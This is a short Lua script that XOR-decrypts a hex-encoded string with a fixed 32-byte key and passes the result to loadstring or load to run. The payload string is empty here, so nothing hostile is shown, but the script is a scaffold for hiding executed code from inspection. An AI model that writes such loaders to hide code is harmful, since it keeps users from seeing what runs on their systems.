local k={20,14,175,158,227,133,22,12,154,238,225,140,206,11,18,227,254,39,211,202,14,183,24,127,252,28,171,242,201,106,149,35}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
